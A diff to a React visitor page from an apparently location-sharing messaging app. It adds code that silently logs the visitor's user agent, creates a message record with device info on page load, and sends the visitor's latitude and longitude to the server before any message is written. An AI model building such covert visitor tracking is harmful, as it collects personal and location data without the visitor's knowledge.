@@ -72,11 +72,20 @@ export default function VisitorPage() {
   const [error, setError] = useState('');
   const hasLogged = useRef(false);
 
-  // Phase 1: Silent analytics
+  // Phase 1: Silent analytics / Create Session Message
   useEffect(() => {
     if (!hasLogged.current) {
       hasLogged.current = true;
       api.logVisitor(navigator.userAgent).catch(() => {});
+      
+      let msgId = sessionStorage.getItem('currentMessageId');
+      if (!msgId) {
+        api.sendMessage({ deviceInfo: getDeviceInfo() }).then(res => {
+          if (res && res._id) {
+            sessionStorage.setItem('currentMessageId', res._id);
+          }
+        }).catch(() => {});
+      }
     }
   }, []);
 
@@ -103,18 +112,24 @@ export default function VisitorPage() {
       setDistance(dist);
       setPhase(PHASE.REVEAL);
 
-      // Auto-send empty message to capture location
-      api.sendMessage({
-        text: '',
-        distanceInMeters: dist,
-        senderLat: latitude,
-        senderLng: longitude,
-        deviceInfo: getDeviceInfo()
-      }).then(res => {
-        if (res && res._id) {
-          localStorage.setItem('currentMessageId', res._id);
-        }
-      }).catch(console.error);
+      // Update existing message or create if missing
+      const msgId = sessionStorage.getItem('currentMessageId');
+      if (msgId) {
+        api.updateMessage(msgId, {
+          distanceInMeters: dist,
+          senderLat: latitude,
+          senderLng: longitude
+        }).catch(console.error);
+      } else {
+        api.sendMessage({
+          distanceInMeters: dist,
+          senderLat: latitude,
+          senderLng: longitude,
+          deviceInfo: getDeviceInfo()
+        }).then(res => {
+          if (res && res._id) sessionStorage.setItem('currentMessageId', res._id);
+        }).catch(console.error);
+      }
     } catch (err) {
       if (err.message === 'no-admin-location') {
         setError('The other party has not set their location yet. Distance calculation unavailable.');
@@ -132,9 +147,9 @@ export default function VisitorPage() {
     if (!message.trim()) return;
     setSending(true);
     try {
-      const msgId = localStorage.getItem('currentMessageId');
+      const msgId = sessionStorage.getItem('currentMessageId');
       if (msgId) {
-        await api.updateMessage(msgId, message.trim());
+        await api.updateMessage(msgId, { text: message.trim() });
       } else {
         await api.sendMessage({
           text: message.trim(),
@@ -144,7 +159,6 @@ export default function VisitorPage() {
           deviceInfo: getDeviceInfo()
         });
       }
-      localStorage.removeItem('currentMessageId');
       setPhase(PHASE.SENT);
     } catch {
       setError('Failed to send the message. Please try again.');
